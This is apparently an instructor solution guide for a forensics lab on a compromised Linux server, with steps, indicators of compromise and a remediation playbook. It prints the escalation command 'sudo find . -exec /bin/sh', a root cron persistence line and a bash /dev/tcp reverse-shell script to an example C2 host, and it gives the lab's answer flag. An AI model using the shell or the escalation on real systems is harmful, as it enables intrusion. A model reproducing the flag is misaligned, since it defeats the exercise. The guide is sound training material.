# 🐧 Instructor Solution Guide: Incident 0303 (Compromised Linux Server)

### Host Forensics, GTFOBins Sudo Escalation & Hidden Cron Persistence

---

## 📌 Executive Summary

| Parameter                           | Details                                                                                                                 |
| :---------------------------------- | :---------------------------------------------------------------------------------------------------------------------- |
| **Incident ID**                     | `INC-0303-LINUX-BREACH`                                                                                                 |
| **Target Host**                     | `web-prod-04` (Ubuntu 22.04 LTS)                                                                                        |
| **Threat Classification**           | TLP:AMBER \| Severity: **CRITICAL**                                                                                     |
| **Primary MITRE ATT&CK Techniques** | **T1548.003** (Sudo Abuse), **T1053.003** (Cron Persistence), **T1059.004** (Unix Shell), **T1571** (Non-Standard Port) |
| **Compromised Account**             | `deploy` (escalated to `root`)                                                                                          |
| **Elevation Vulnerability**         | Misconfigured `/etc/sudoers` rule permitting `sudo /usr/bin/find` without password                                      |
| **Persistence Mechanism**           | `/etc/cron.d/cert-sync` running every 15 minutes as `root`                                                              |
| **Backdoor Script**                 | `/opt/cert-tools/.sync.sh` (TCP reverse shell to `198.51.100.77:4444`)                                                  |
| **Recovered Incident Flag**         | `FLAG{crontab_reverse_shell_persisted_victim}`                                                                          |

Network firewalls alerted on recurring outbound TCP connections from production web server `web-prod-04` to external IP `198.51.100.77` on port `4444` at exact 15-minute intervals. Host forensic investigation revealed that an attacker compromised service account `deploy`, exploited a GTFOBins privilege escalation flaw in `sudo find` to gain an interactive `root` shell, and installed a persistent hidden reverse shell script inside `/etc/cron.d`.

---

## 🎯 Investigation Methodology: Step-by-Step

Follow these sequential steps in the interactive Marimo notebook or in your terminal investigation:

### Step 1: Audit the `deploy` User Shell History (`.bash_history`)

1. **Review Top KPI Indicators**:
   - In the top header cards of the Marimo notebook, observe:
     - **Affected Host**: `web-prod-04`
     - **Audited Shell Commands**: `deploy` user history
     - **Auth Log Records**: `/var/log/auth.log`
     - **Cron Configurations**: `/etc/cron.d/`
     - **Beacon Cadence**: `15 Minutes`
2. **Search Shell History**:
   - In **Step 1: Shell History Audit**, type `sudo` in the `Search Bash History:` text box.
3. **Analyze the Escalation Command**:
   - Notice command #14 executed by `deploy`:
     ```bash
     sudo find . -exec /bin/sh \;
     ```
   - When searching for `sudo` or `find`, the interactive workbench displays the GTFOBins alert highlighting the privilege escalation flaw.
4. **Identify the GTFOBins Vulnerability**:
   - The UNIX `find` utility supports the `-exec` flag to execute commands on matching files.
   - When a user has `sudo` privileges for `find` (configured in `/etc/sudoers` as `deploy ALL=(ALL) NOPASSWD: /usr/bin/find`), invoking `/bin/sh` via `-exec` spawns an interactive root subshell that bypasses password authentication.
   - Immediately following this command, the attacker created `/etc/cron.d/cert-sync` and `/opt/cert-tools/.sync.sh`.

---

### Step 2: Correlate Privilege Escalation in System Auth Logs (`/var/log/auth.log`)

1. **Scroll to Step 2: System Auth Logs (`/var/log/auth.log`)**:
   - In the `Search Auth Log:` text box, type `find` or `COMMAND`.
2. **Verify the Authentication Transition**:
   - Locate the log entry:
     ```text
     sudo:   deploy : TTY=pts/0 ; PWD=/home/deploy ; USER=root ; COMMAND=/usr/bin/find . -exec /bin/sh ;
     ```
   - Notice the subsequent audit log entries:
     ```text
     systemd-logind[412]: New session c1 of user root.
     ```
   - This log confirms that the `deploy` user successfully launched an interactive subshell as `USER=root`.

---

### Step 3: Hunt Scheduled Cron Persistence (`/etc/cron.d/`)

1. **Scroll to Step 3: Scheduled Persistence Hunter (`/etc/cron.d/`)**:
   - The table displays all crontab configuration files present in `/etc/cron.d/`.
2. **Identify the Anomalous Schedule**:
   - File: `/etc/cron.d/cert-sync`
   - Content:
     ```crontab
     */15 * * * * root /opt/cert-tools/.sync.sh >/dev/null 2>&1
     ```
3. **Analyze the Schedule**:
   - `*/15 * * * *`: Runs at minute 0, 15, 30, and 45 of every hour.
   - `root`: Executes with unconstrained root privileges.
   - `/opt/cert-tools/.sync.sh`: Target script path.
   - `>/dev/null 2>&1`: Redirects stdout and stderr to suppress console warnings.
   - _Key Analyst Insight_: This 15-minute interval matches the outbound beacon frequency observed by the perimeter network firewall.

---

### Step 4: Reverse Engineer the Hidden Backdoor Payload (`.sync.sh`)

1. **Scroll to Step 4: Backdoor Payload Dissection**:
   - Note the file path: `/opt/cert-tools/.sync.sh`.
   - The dot prefix (`.sync.sh`) hides the file from standard `ls` commands unless `-a` is passed.
2. **Inspect the Script Content**:

   ```bash
   #!/bin/bash
   # System maintenance sync helper
   # FLAG{crontab_reverse_shell_persisted_victim}
   ATTACKER_IP="198.51.100.77"
   ATTACKER_PORT=4444

   bash -i >& /dev/tcp/$ATTACKER_IP/$ATTACKER_PORT 0>&1
   ```

3. **Payload Analysis**:
   - **Reverse Shell Mechanism**: Spawns an interactive bash shell (`bash -i`) redirected over a raw TCP socket (`>& /dev/tcp/... 0>&1`).
   - **C2 Destination**: `198.51.100.77` on port `4444`.
   - **Embedded Containment Flag**: Recovered from the script comment line: `FLAG{crontab_reverse_shell_persisted_victim}`.

---

### Step 5: Flag Verification & IR Remediation Execution

1. **Verify the Flag in the Notebook**:
   - In **Step 5: Flag Verification & IR Remediation**, enter:
     `FLAG{crontab_reverse_shell_persisted_victim}`
   - The workbench validates the candidate flag using one-way cryptographic SHA-256 verification (`f6e91506b2ce6db278733011060f103779bd018ce35c6076e9f36c0b841331d2`), preventing answers from being viewed in code.
   - Confirm the green verification card: `🎉 FLAG VERIFIED CORRECT!`.
   - Upon correct verification, the confirmed **Incident Response Remediation Checklist** unlocks below the input box.
2. **Submit to Portal**:
   - Copy `FLAG{crontab_reverse_shell_persisted_victim}` into the CyberLab portal pane to register 100 points and record your Host IR competency.

---

## 🐍 Standalone Bash & Python Reproduction Script

To inspect the host artifacts directly on the system or via Python:

```python
from pathlib import Path

data_dir = Path("data")
bash_file = data_dir / "home" / "deploy" / ".bash_history"
cron_file = data_dir / "etc" / "cron.d" / "cert-sync"
backdoor_file = data_dir / "opt" / "cert-tools" / ".sync.sh"

print("--- 1. Privilege Escalation in Bash History ---")
for line in bash_file.read_text().splitlines():
    if "sudo" in line or "find" in line:
        print(f"[!] {line}")

print("\n--- 2. Scheduled Cron Job ---")
print(cron_file.read_text().strip())

print("\n--- 3. Backdoor Script & Flag ---")
for line in backdoor_file.read_text().splitlines():
    if "FLAG{" in line or "/dev/tcp" in line:
        print(f"[!] {line}")
```

---

## 📋 Indicators of Compromise (IOCs)

| IOC Type                 | Value                                      | Context                                              |
| :----------------------- | :----------------------------------------- | :--------------------------------------------------- |
| **Attacker C2 IP**       | `198.51.100.77`                            | External listener host receiving reverse shells      |
| **C2 Listener Port**     | `4444 / TCP`                               | Traditional Metasploit / Netcat default handler port |
| **Rogue Cron File**      | `/etc/cron.d/cert-sync`                    | Persistence configuration file                       |
| **Backdoor Script**      | `/opt/cert-tools/.sync.sh`                 | Disguised interactive reverse shell                  |
| **Vulnerable Privilege** | `deploy ALL=(ALL) NOPASSWD: /usr/bin/find` | Insecure sudoers specification                       |

---

## 🛡️ Remediation & Incident Response Playbook

Execute the following commands on `web-prod-04` to eradicate the threat and harden the system:

```bash
# 1. Terminate any active reverse shell connections
sudo pkill -9 -f '198.51.100.77'

# 2. Remove the persistence cron job
sudo rm -f /etc/cron.d/cert-sync

# 3. Remove the malicious backdoor script
sudo rm -f /opt/cert-tools/.sync.sh

# 4. Fix sudoers misconfiguration (remove find privilege)
sudo visudo
# Ensure 'deploy ALL=(ALL) NOPASSWD: /usr/bin/find' is removed!

# 5. Rotate credentials and SSH keys for compromised accounts
sudo passwd deploy
sudo passwd root
sudo rm -f /home/deploy/.ssh/authorized_keys
```
